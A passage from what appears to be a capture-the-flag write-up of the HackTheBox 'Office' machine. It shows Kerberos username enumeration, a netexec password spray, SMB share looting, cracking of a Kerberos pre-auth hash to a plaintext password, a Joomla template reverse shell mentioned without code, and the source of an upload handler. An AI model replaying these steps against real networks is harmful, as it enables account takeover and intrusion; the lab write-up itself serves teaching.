</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">//</span>_<span style="color:#ff79c6">/</span> _ \<span style="color:#ff79c6">/</span> ___<span style="color:#ff79c6">/</span> __ \<span style="color:#ff79c6">/</span> ___<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> __<span style="color:#ff79c6">/</span> _ \
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">/</span> ,<span style="color:#ff79c6">&lt;</span> <span style="color:#ff79c6">/</span>  __<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>  <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>  <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span>  __<span style="color:#ff79c6">/</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/|</span>_<span style="color:#ff79c6">|</span>\___<span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span>  <span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">.</span>___<span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span>   \__,_<span style="color:#ff79c6">/</span>\__<span style="color:#ff79c6">/</span>\___<span style="color:#ff79c6">/</span>                                        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Version: dev (n<span style="color:#ff79c6">/</span>a) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">24</span> <span style="color:#ff79c6">-</span> Ronnie Flathers @ropnop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">08</span>:<span style="color:#bd93f9">53</span> <span style="color:#ff79c6">&gt;</span>  Using KDC(s):
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">08</span>:<span style="color:#bd93f9">53</span> <span style="color:#ff79c6">&gt;</span>  	dc<span style="color:#ff79c6">.</span>office<span style="color:#ff79c6">.</span>htb:<span style="color:#bd93f9">88</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">09</span>:<span style="color:#bd93f9">30</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 administrator@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">12</span>:<span style="color:#bd93f9">34</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 Administrator@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">57</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 ewhite@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">57</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 etower@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">58</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 dwolfe@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">59</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 dlanor@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">59</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 dmichael@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">54</span>:<span style="color:#bd93f9">19</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 hhogan@office<span style="color:#ff79c6">.</span>htb
</span></span></code></pre></div><p>Now let&rsquo;s try <code>netexec</code> to spray the password using these usernames.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ nxc ldap dc.office.htb -u ad_users.txt -p &#39;H0lOgrams4reTakIng0Ver754!&#39;      
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    dc.office.htb    [-] Error retrieving os arch of 10.10.11.3: Could not connect: timed out
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>LDAPS       10.10.11.3      636    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
</span></span></code></pre></div><p>Looks like I got a match for the user <code>dwolfe</code>. Let&rsquo;s enumerate his shares.</p>
</li>
<li>
<p><strong>SMB Enumeration</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ nxc smb dc.office.htb -u &#39;dwolfe&#39; -p &#39;H0lOgrams4reTakIng0Ver754!&#39; --shares
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               [*] Enumerated shares
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               Share           Permissions     Remark
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               -----           -----------     ------
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               C$                              Default share
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               SOC Analysis    READ            
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share
</span></span></code></pre></div><p>I found an unusual share named <code>SOC Analysis</code> let&rsquo;s dump it using <code>smbclient</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ smbclient &#39;\\10.10.11.3\SOC Analysis&#39; -U dwolfe -L
</span></span><span style="display:flex;"><span>Password for [WORKGROUP\dwolfe]:
</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: \&gt; dir
</span></span><span style="display:flex;"><span>  .                                   D        0  Wed May 10 13:52:24 2023
</span></span><span style="display:flex;"><span>  ..                                DHS        0  Wed Feb 14 04:18:31 2024
</span></span><span style="display:flex;"><span>  Latest-System-Dump-8fbc124d.pcap      A  1372860  Sun May  7 19:59:00 2023
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		6265599 blocks of size 4096. 1193500 blocks available
</span></span><span style="display:flex;"><span>smb: \&gt; get Latest-System-Dump-8fbc124d.pcap
</span></span><span style="display:flex;"><span>getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (387.6 KiloBytes/sec) (average 387.6 KiloBytes/sec)
</span></span><span style="display:flex;"><span>smb: \&gt; exit
</span></span></code></pre></div><p>Let&rsquo;s analyze the pcap file using wireshark.</p>
</li>
<li>
<p><strong>PCap Analysis</strong></p>
<p><img src="images/wireshark.png" alt="pcap analysis"></p>
<p><img src="images/kerberos.png" alt="alt text"></p>
</li>
<li>
<p><strong>ASREQRoast - Cracking Pre-Auth Timestamp</strong></p>
<p>After analyzing the pcap file I found two <code>AS-REQ</code>. In a typical kerberos setup the the pre-auth feature is enabled by default. If it is enabled we cannot perform <code>ASREPRoast</code> attack. But it opens another vector for an attack. In kerberos when pre-auth is enabled the client encrypts the current timestamp with it&rsquo;s own password as an encryption key. So, if the password is weak enough we can obtain it using <code>hashcat</code> by trying to decrypt the <code>cipher</code> which is shown in the figure. Here the etype is <code>18</code>. So the mode for hashcat would be <code>19900</code>. Which depicts Pre-Auth in hashcat&rsquo;s documentation.</p>
<p>Also I discovered the <code>cname</code> object contained <code>cname-string: tstark</code> this is the user sending the request. So the user is <code>tstark@office.htb</code>. Now let&rsquo;s construct the hash for hashcat.</p>
</li>
<li>
<p><strong>Hashcat</strong></p>
<p>Hash</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
</span></span></code></pre></div><p>Cracked</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
</span></span></code></pre></div></li>
</ul>
<h2 id="foothold">Foothold</h2>
<p>I tried the cracked password against the AD but didn&rsquo;t work. But it worked against Joomla Admin Dashboard. Let&rsquo;s try to get a reverse shell on Joomla Dashboard using templates. I got a shell of the <code>web_account</code> user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>C:\xampp\htdocs\joomla\templates\cassiopeia&gt;whoami
</span></span><span style="display:flex;"><span>office\web_account
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\xampp\htdocs\joomla\templates\cassiopeia&gt;
</span></span></code></pre></div><p>The <code>htdocs</code> folder contained anothe directory named <code>internal</code> besides <code>joomla</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>C:\xampp\htdocs&gt;dir
</span></span><span style="display:flex;"><span> Volume in drive C has no label.
</span></span><span style="display:flex;"><span> Volume Serial Number is C626-9388
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> Directory of C:\xampp\htdocs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>05/09/2023  07:53 AM    &lt;DIR&gt;          .
</span></span><span style="display:flex;"><span>01/24/2024  05:08 AM    &lt;DIR&gt;          ..
</span></span><span style="display:flex;"><span>05/09/2023  07:53 AM    &lt;DIR&gt;          administrator
</span></span><span style="display:flex;"><span>01/30/2024  09:39 AM    &lt;DIR&gt;          internal
</span></span><span style="display:flex;"><span>04/30/2024  07:15 AM    &lt;DIR&gt;          joomla
</span></span><span style="display:flex;"><span>               0 File(s)              0 bytes
</span></span><span style="display:flex;"><span>               5 Dir(s)   5,044,477,952 bytes free
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\xampp\htdocs&gt;
</span></span></code></pre></div><p>One file seemed interesting inside the internal directory. It was <code>resume.php</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>C:\xampp\htdocs\internal&gt;dir
</span></span><span style="display:flex;"><span> Volume in drive C has no label.
</span></span><span style="display:flex;"><span> Volume Serial Number is C626-9388
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> Directory of C:\xampp\htdocs\internal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>01/30/2024  09:39 AM    &lt;DIR&gt;          .
</span></span><span style="display:flex;"><span>05/09/2023  07:53 AM    &lt;DIR&gt;          ..
</span></span><span style="display:flex;"><span>02/14/2024  06:35 PM    &lt;DIR&gt;          applications
</span></span><span style="display:flex;"><span>05/01/2023  04:27 PM    &lt;DIR&gt;          css
</span></span><span style="display:flex;"><span>05/01/2023  04:27 PM    &lt;DIR&gt;          img
</span></span><span style="display:flex;"><span>01/30/2024  09:38 AM             5,113 index.html
</span></span><span style="display:flex;"><span>01/30/2024  09:40 AM             5,282 resume.php
</span></span><span style="display:flex;"><span>               2 File(s)         10,395 bytes
</span></span><span style="display:flex;"><span>               5 Dir(s)   5,038,227,456 bytes free
</span></span></code></pre></div><p><strong>resume.php</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>?php
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">$</span>notifi <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">$</span>_SERVER[<span style="color:#f1fa8c">&#34;REQUEST_METHOD&#34;</span>] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;POST&#34;</span> ){
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>stdname<span style="color:#ff79c6">=</span>trim(<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;fullname&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>email<span style="color:#ff79c6">=</span>str_replace(<span style="color:#f1fa8c">&#39;.&#39;</span>,<span style="color:#f1fa8c">&#39;-&#39;</span>,<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;email&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>experience<span style="color:#ff79c6">=</span>trim(<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;experience&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>salary<span style="color:#ff79c6">=</span>trim(<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;salary&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>department<span style="color:#ff79c6">=</span>trim(<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;department&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>rewritefn <span style="color:#ff79c6">=</span> strtolower(str_replace(<span style="color:#f1fa8c">&#39; &#39;</span>,<span style="color:#f1fa8c">&#39;-&#39;</span>,<span style="color:#f1fa8c">&#34;$stdname-$department-$salary $experience $email&#34;</span>));
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filename <span style="color:#ff79c6">=$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;name&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filetype<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;type&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filesize <span style="color:#ff79c6">=$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;size&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>fileerr <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;error&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filetmp <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;tmp_name&#39;</span>];
</span></span><span style="display:flex;"><span>  chmod(<span style="color:#ff79c6">$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;tmp_name&#39;</span>], <span style="color:#bd93f9">0664</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">//</span> onigiri <span style="color:#ff79c6">in</span> <span style="color:#ff79c6">.</span>
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">$</span>ext <span style="color:#ff79c6">=</span> explode(<span style="color:#f1fa8c">&#39;.&#39;</span>,<span style="color:#ff79c6">$</span>filename);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">//</span>last piece of data from array
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">$</span>extension <span style="color:#ff79c6">=</span> strtolower(end(<span style="color:#ff79c6">$</span>ext));
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filesallowed <span style="color:#ff79c6">=</span> array(<span style="color:#f1fa8c">&#39;docm&#39;</span>,<span style="color:#f1fa8c">&#39;docx&#39;</span>,<span style="color:#f1fa8c">&#39;doc&#39;</span>,<span style="color:#f1fa8c">&#39;odt&#39;</span>);
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">if</span>(in_array(<span style="color:#ff79c6">$</span>extension,<span style="color:#ff79c6">$</span>filesallowed)){
</span></span><span style="display:flex;"><span>     <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">$</span>fileerr <span style="color:#ff79c6">===</span> <span style="color:#bd93f9">0</span>){
</span></span><span style="display:flex;"><span>       <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">$</span>filesize <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">5242880</span>){
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">$</span>ff <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;$rewritefn.$extension&#34;</span>;
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">$</span>loc <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;applications/&#34;</span><span style="color:#ff79c6">.$</span>ff;
</span></span><span style="display:flex;"><span>	   <span style="color:#ff79c6">if</span>(move_uploaded_file(<span style="color:#ff79c6">$</span>filetmp,<span style="color:#ff79c6">$</span>loc))
</span></span><span style="display:flex;"><span>	   {
</span></span><span style="display:flex;"><span>	     <span style="color:#ff79c6">//</span> upload successful
</span></span><span style="display:flex;"><span>	     <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;✔ Upload Successful!&lt;/span&gt;&lt;hr/&gt;&lt;style&gt;</span>
</span></span><span style="display:flex;"><span>	       button, input , select, option, h3{
</span></span><span style="display:flex;"><span>			display:none;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	       <span style="color:#ff79c6">&lt;/</span>style<span style="color:#ff79c6">&gt;</span><span style="color:#f1fa8c">&#34;;</span>
</span></span><span style="display:flex;"><span>	 } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>echo <span style="color:#ff79c6">$</span>loc;
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;✖️  Something Went Wrong! Unable To upload the Resume!&lt;/span&gt;&lt;hr/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>	 }
</span></span><span style="display:flex;"><span>       
</span></span><span style="display:flex;"><span>       } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>	 
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;⚠️  Your Resume should be less than 5MB!&lt;/span&gt;&lt;hr/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>       }
</span></span><span style="display:flex;"><span>     
</span></span><span style="display:flex;"><span>     } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;✖️  Corrupted File/Unable to Upload!&lt;/span&gt;&lt;hr/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>     }
</span></span><span style="display:flex;"><span>   
</span></span><span style="display:flex;"><span>   } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;❌ Accepted File Types : Doc, Docx, Docm, Odt!&lt;/span&gt;&lt;hr/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>?<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;!</span>DOCTYPE html<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>html lang<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;en&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>head<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>meta charset<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">&lt;</span>link rel<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;shortcut icon&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://www.pinclipart.com/picdir/big/344-3445944_png-file-svg-terminal-icon-png-clipart.png&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>title<span style="color:#ff79c6">&gt;</span>Resume Submission<span style="color:#ff79c6">&lt;/</span>title<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>meta name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewport&#34;</span> content<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width=device-width, initial-scale=1.0&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>style type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text/css&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>body{
</span></span><span style="display:flex;"><span>height:<span style="color:#bd93f9">100</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span>overflow:auto;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>notifi{
</span></span><span style="display:flex;"><span>font<span style="color:#ff79c6">-</span>weight:bold;
</span></span><span style="display:flex;"><span>padding:<span style="color:#bd93f9">0</span>px;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>notifi hr{
</span></span><span style="display:flex;"><span>background:<span style="color:#6272a4">#000000;</span>
</span></span><span style="display:flex;"><span>height:<span style="color:#bd93f9">2</span>px;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>magic{
</span></span><span style="display:flex;"><span>margin<span style="color:#ff79c6">-</span>top:<span style="color:#bd93f9">0.5</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">max</span><span style="color:#ff79c6">-</span>height:<span style="color:#bd93f9">90</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">max</span><span style="color:#ff79c6">-</span>width:<span style="color:#bd93f9">90</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span>border: <span style="color:#bd93f9">2</span>px solid <span style="color:#6272a4">#000000;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>inpstylef{
</span></span><span style="display:flex;"><span>border<span style="color:#ff79c6">-</span>bottom: <span style="color:#bd93f9">2</span>px solid <span style="color:#6272a4">#000000;</span>
</span></span><span style="display:flex;"><span>padding:<span style="color:#bd93f9">0.5</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span>font<span style="color:#ff79c6">-</span>size:<span style="color:#bd93f9">14</span>px;
</span></span><span style="display:flex;"><span>font<span style="color:#ff79c6">-</span>weight:bold;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>inputstyle ,<span style="color:#ff79c6">.</span>inpstyles {
</span></span><span style="display:flex;"><span>width:<span style="color:#bd93f9">69</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span>height:<span style="color:#bd93f9">35</span>px;
</span></span><span style="display:flex;"><span>border:<span style="color:#bd93f9">2</span>px solid <span style="color:#6272a4">#000000;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>inpstylef::<span style="color:#ff79c6">-</span>webkit<span style="color:#ff79c6">-</span>file<span style="color:#ff79c6">-</span>upload<span style="color:#ff79c6">-</span>button {
</span></span><span style="display:flex;"><span>  visibility: hidden;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>inpstylef::before {
</span></span><span style="display:flex;"><span>  content: <span style="color:#f1fa8c">&#39;  &#39;</span>;
</span></span><span style="display:flex;"><span>  display: inline<span style="color:#ff79c6">-</span>block;
</span></span><span style="display:flex;"><span>  border: <span style="color:#bd93f9">1</span>px solid <span style="color:#6272a4">#999;</span>
</span></span><span style="display:flex;"><span>  border<span style="color:#ff79c6">-</span>radius: <span style="color:#bd93f9">3</span>px;
